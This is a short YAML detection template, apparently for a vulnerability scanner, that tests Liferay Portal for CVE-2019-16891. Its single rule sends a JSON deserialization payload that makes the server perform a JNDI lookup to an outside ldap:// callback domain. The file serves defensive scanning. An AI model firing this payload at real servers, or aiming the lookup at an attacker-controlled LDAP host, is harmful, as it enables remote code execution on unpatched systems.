name: yaml-poc-liferay-liferay_portal-logical-CVE-2019-16891
binding: f82e1072-deaf-4861-a77d-ffc0a788e925
detail:
    author: jiapeng.han
    links:
        - https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from
        - https://nvd.nist.gov/vuln/detail/CVE-2019-16891
        - https://sec.vnpt.vn/2019/09/liferay-deserialization-json-deserialization-part-4/
        - https://www.liferay.com/downloads-community
        - https://www.youtube.com/watch?v=DjMEfQW3bf0
    vulnerability:
        id: 243c7483-bb5c-4ba9-9d41-a84300dc6f49
        level: critical
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseDomain: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /c/portal/port_url
            headers:
                Content-Type: application/json
            body: parameterMap={"javaClass":"org.hibernate.jmx.StatisticsService","sessionFactoryJNDIName":ldap://{{reverseDomain}}"}
            follow_redirects: false
        expression: reverse.wait(5)
expression: r0()
